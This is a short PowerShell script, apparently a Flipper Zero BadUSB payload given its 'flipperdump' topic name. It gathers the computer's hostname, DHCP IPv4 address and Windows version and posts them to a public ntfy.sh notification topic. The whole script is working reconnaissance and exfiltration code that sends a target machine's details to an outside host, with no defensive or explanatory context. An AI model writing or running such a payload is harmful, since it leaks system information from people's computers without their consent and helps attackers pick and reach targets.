$topic = 'flipperdump'
$hostname = $env:COMPUTERNAME
$ipAddress = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.PrefixOrigin -eq 'Dhcp' }).IPAddress
$osVersion = (Get-CimInstance Win32_OperatingSystem).Caption + ' ' + (Get-CimInstance Win32_OperatingSystem).Version
$message = "Host: $hostname`nIP: $ipAddress`nOS: $osVersion"
Invoke-RestMethod -Method Post -Uri ('https://ntfy.sh/' + $topic) -Body $message
